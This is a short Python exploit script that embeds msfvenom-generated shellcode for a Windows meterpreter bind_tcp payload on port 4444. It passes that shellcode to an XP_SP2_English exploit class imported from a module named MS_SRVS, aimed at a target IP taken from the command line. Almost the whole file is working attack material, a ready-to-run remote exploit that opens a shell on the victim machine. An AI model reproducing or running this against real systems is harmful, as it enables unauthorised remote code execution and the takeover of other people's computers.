# -*- coding: utf-8 -*-

from sys import argv
from MS_SRVS import *

# msfvenom
#   --platform Windows
#   -a x86
#   -p windows/meterpreter/bind_tcp EXITFUNC=thread LPORT=4444
#   -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40'
Payloadx86 = (
    '\x33\xc9\x83\xe9\xad\xe8\xff\xff\xff\xff\xc0\x5e\x81'
    '\x76\x0e\x91\x3a\x12\xc7\x83\xee\xfc\xe2\xf4\x6d\xd2'
    '\x90\xc7\x91\x3a\x72\x4e\x74\x0b\xd2\xa3\x1a\x6a\x22'
    '\x4c\xc3\x36\x99\x95\x85\xb1\x60\xef\x9e\x8d\x58\xe1'
    '\xa0\xc5\xbe\xfb\xf0\x46\x10\xeb\xb1\xfb\xdd\xca\x90'
    '\xfd\xf0\x35\xc3\x6d\x99\x95\x81\xb1\x58\xfb\x1a\x76'
    '\x03\xbf\x72\x72\x13\x16\xc0\xb1\x4b\xe7\x90\xe9\x99'
    '\x8e\x89\xd9\x28\x8e\x1a\x0e\x99\xc6\x47\x0b\xed\x6b'
    '\x50\xf5\x1f\xc6\x56\x02\xf2\xb2\x67\x39\x6f\x3f\xaa'
    '\x47\x36\xb2\x75\x62\x99\x9f\xb5\x3b\xc1\xa1\x1a\x36'
    '\x59\x4c\xc9\x26\x13\x14\x1a\x3e\x99\xc6\x41\xb3\x56'
    '\xe3\xb5\x61\x49\xa6\xc8\x60\x43\x38\x71\x65\x4d\x9d'
    '\x1a\x28\xf9\x4a\xcc\x52\x21\xf5\x91\x3a\x7a\xb0\xe2'
    '\x08\x4d\x93\xf9\x76\x65\xe1\x96\xc5\xc7\x7f\x01\x3b'
    '\x12\xc7\xb8\xfe\x46\x97\xf9\x13\x92\xac\x91\xc5\xc7'
    '\xad\x9a\x63\x42\x25\x6c\x50\x13\xad\x93\x52\xf8\xc8'
    '\x4e\xda\xed\x12\x06\x52\x10\xc7\x80\x66\x9b\x21\xfb'
    '\x2a\x44\x90\xf9\xf8\xc9\xf0\xf6\xc5\xc7\x42\x51\x4f'
    '\x4a\x90\xf9\x8d\xfb\xff\x6e\xc5\xc7\x90\xf9\x4e\xfe'
    '\xfc\x70\xc5\xc7\x90\x06\x52\x67\xa9\xdc\x5b\xed\x12'
    '\xfb\x3a\x78\xc3\xc7\x6d\x7a\xc5\x48\xf2\x4d\x38\x44'
    '\xb9\xea\xc7\xef\x17\x99\xf1\xfb\x7a\x7a\xc7\x81\x3a'
    '\x12\x91\xfb\x3a\x7a\x9f\x35\x69\xf7\x38\x44\xa9\x41'
    '\xad\x91\x6c\x41\x90\xf9\x38\xcb\x0f\xce\xc5\xc7\x44'
    '\x69\x3a\x6c\xc0\x90\xf9\x3b\x01\xe4\xd3\xd1\x7c\x71'
    '\x27\x38\xcd\xf9\x9c\x87\x7a\x0c\xc5\xc7\xfb\x97\x46'
    '\x18\x47\x6a\xda\x67\xc2\x2a\x7d\x01\xb5\xfe\x50\x12'
    '\x94\x6e\xef\x12\xc7'
)

if len(argv) != 2:
    print(argv[0] + ' {ip address}')
else:
    XP_SP2_English(argv[1]).Exploit(Payloadx86)